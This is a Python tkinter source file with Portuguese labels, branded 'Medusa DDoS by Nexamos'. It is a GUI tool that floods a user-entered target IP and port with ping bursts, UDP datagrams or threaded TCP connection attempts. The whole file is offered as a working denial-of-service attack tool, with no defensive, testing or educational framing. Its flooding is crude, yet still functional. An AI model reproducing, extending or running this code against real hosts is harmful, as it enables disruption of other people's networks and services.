import tkinter as tk
from tkinter import ttk, messagebox
import socket
import subprocess
import ipaddress
import threading
from concurrent.futures import ThreadPoolExecutor

# ================== ESTILO ==================
BG = "#070707"
FG = "#ff0033"
ACCENT = "#ff3355"
ENTRY_BG = "#111111"
BTN_BG = "#1a0008"
LOG_BG = "#030303"

FONT = ("Consolas", 11)
TITLE_FONT = ("Consolas", 18, "bold")
SMALL_FONT = ("Consolas", 9)

# ================== HELPERS ==================
def log_msg(msg):
    log.insert(tk.END, f"> {msg}\n")
    log.see(tk.END)

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# ================== ICMP ==================
def send_icmp(ip, total):
    log_msg(f"[ICMP] Enviando {total} pacotes para {ip}...")
    subprocess.run(
        ["ping", "-n", str(total), ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    log_msg(f"[ICMP] Finalizado ({total} pacotes)")

# ================== UDP ==================
def send_udp(ip, port, total):
    def worker():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"-", (ip, port))
            s.close()
        except:
            pass

    log_msg(f"[UDP] Enviando {total} pacotes para {ip}:{port}")
    with ThreadPoolExecutor(max_workers=50) as ex:
        for _ in range(total):
            ex.submit(worker)
    log_msg(f"[UDP] Finalizado ({total} pacotes)")

# ================== TCP ==================
def send_tcp(ip, port, total):
    def worker():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.close()
        except:
            pass

    log_msg(f"[TCP] Enviando {total} SYNs para {ip}:{port}")
    with ThreadPoolExecutor(max_workers=50) as ex:
        for _ in range(total):
            ex.submit(worker)
    log_msg(f"[TCP] Finalizado ({total} SYNs)")

# ================== DISPATCH ==================
def send_packet():
    ip = entry_ip.get().strip()
    port = entry_port.get().strip()
    protocol = protocol_var.get()
    packets = entry_packets.get().strip()

    if not validate_ip(ip):
        messagebox.showerror("Erro", "IP inválido")
        return

    if not packets.isdigit() or int(packets) <= 0:
        messagebox.showerror("Erro", "Quantidade de pacotes inválida")
        return

    packets = int(packets)

    if protocol == "ICMP":
        threading.Thread(
            target=send_icmp,
            args=(ip, packets),
            daemon=True
        ).start()

    elif protocol == "UDP":
        if not port.isdigit():
            messagebox.showerror("Erro", "Porta inválida")
            return
        threading.Thread(
            target=send_udp,
            args=(ip, int(port), packets),
            daemon=True
        ).start()

    elif protocol == "TCP":
        if not port.isdigit():
            messagebox.showerror("Erro", "Porta inválida")
            return
        threading.Thread(
            target=send_tcp,
            args=(ip, int(port), packets),
            daemon=True
        ).start()

# ================== UI LOGIC ==================
def on_protocol_change(event=None):
    if protocol_var.get() == "ICMP":
        entry_port.config(state="disabled")
        entry_port.delete(0, tk.END)
    else:
        entry_port.config(state="normal")

# ================== GUI ==================
root = tk.Tk()
root.title("DDoS Louco // Industria da Tia Louca")
root.geometry("600x520")
root.configure(bg=BG)

tk.Label(root, text="Medusa DDoS by Nexamos", fg=FG, bg=BG, font=TITLE_FONT).pack(pady=(10, 0))
tk.Label(root, text="REALIZE DDoS SEM FIM", fg=ACCENT, bg=BG, font=SMALL_FONT).pack(pady=(0, 10))

frame = tk.Frame(root, bg=BG)
frame.pack(pady=10)

def label(text):
    return tk.Label(frame, text=text, fg=FG, bg=BG, font=FONT)

def entry(width=34):
    return tk.Entry(frame, bg=ENTRY_BG, fg=FG, insertbackground=FG, font=FONT, relief="flat", width=width)

label("IP DO ALVO").grid(row=0, column=0, sticky="w")
entry_ip = entry()
entry_ip.grid(row=1, column=0, pady=5)

label("PORTA (TCP / UDP)").grid(row=2, column=0, sticky="w")
entry_port = entry()
entry_port.grid(row=3, column=0, pady=5)

label("PACOTES").grid(row=4, column=0, sticky="w")
entry_packets = entry()
entry_packets.insert(0, "10")
entry_packets.grid(row=5, column=0, pady=5)

label("PROTOCOLO").grid(row=6, column=0, sticky="w")
protocol_var = tk.StringVar(value="ICMP")
protocol_menu = ttk.Combobox(
    frame,
    textvariable=protocol_var,
    values=["ICMP", "UDP", "TCP"],
    state="readonly",
    width=31
)
protocol_menu.grid(row=7, column=0, pady=5)
protocol_menu.bind("<<ComboboxSelected>>", on_protocol_change)

tk.Button(
    root,
    text=">> MANDANDO CHIBATA <<",
    bg=BTN_BG,
    fg=FG,
    activebackground="#33000f",
    activeforeground=FG,
    font=("Consolas", 12, "bold"),
    relief="flat",
    width=24,
    command=send_packet
).pack(pady=15)

log = tk.Text(root, bg=LOG_BG, fg=FG, insertbackground=FG, font=("Consolas", 10), height=10, relief="flat")
log.pack(fill="x", padx=15, pady=10)

on_protocol_change()
root.mainloop()
